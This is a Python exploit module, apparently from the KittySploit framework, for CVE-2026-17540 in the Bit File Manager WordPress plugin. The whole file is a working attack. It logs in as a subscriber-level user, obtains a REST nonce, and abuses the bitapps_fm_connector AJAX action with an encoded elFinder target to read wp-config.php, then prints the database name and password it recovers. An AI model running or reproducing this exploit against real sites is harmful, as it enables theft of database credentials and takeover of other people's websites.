#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Bit File Manager CVE-2026-17540 — bitapps_fm_connector wp-config read."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Bit File Manager CVE-2026-17540 file read",
        "description": (
            "Subscriber login, fetch REST nonce, read wp-config via bitapps_fm_connector."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-17540"],
        "tags": ["wordpress", "file-manager", "lfi", "authenticated", "cve-2026-17540"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    username = OptString("", "WP username (subscriber+)", required=True)
    password = OptString("", "WP password", required=True)
    elfinder_target = OptString(
        "l1_d3AtY29uZmlnLnBocA",
        "elFinder target for wp-config.php",
        required=False,
    )

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        user = (self.username or "").strip()
        pwd = (self.password or "").strip()
        if not user or not pwd:
            print_error("username and password required")
            return False
        login = self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            data={"log": user, "pwd": pwd, "wp-submit": "Log In", "testcookie": "1"},
            allow_redirects=False,
        )
        if not login or "wordpress_logged_in" not in str(login.headers):
            print_error("Login failed")
            return False
        nonce_resp = self.http_request(
            method="GET",
            path=self._join("/wp-admin/admin-ajax.php"),
            params={"action": "rest-nonce"},
            allow_redirects=False,
        )
        m = re.search(r"([a-f0-9]{10,})", nonce_resp.text or "") if nonce_resp else None
        if not m:
            print_error("REST nonce not found")
            return False
        nonce = m.group(1)
        target = (self.elfinder_target or "l1_d3AtY29uZmlnLnBocA").strip()
        read = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            params={
                "action": "bitapps_fm_connector",
                "cmd": "file",
                "target": target,
                "nonce": nonce,
            },
            data={"x": "1"},
            allow_redirects=False,
        )
        body = read.text or "" if read else ""
        if read and "DB_NAME" in body and "DB_PASSWORD" in body:
            print_success("wp-config.php content retrieved")
            print_status(body[:800])
            return True
        print_error("File read failed")
        print_status(body[:400])
        return False
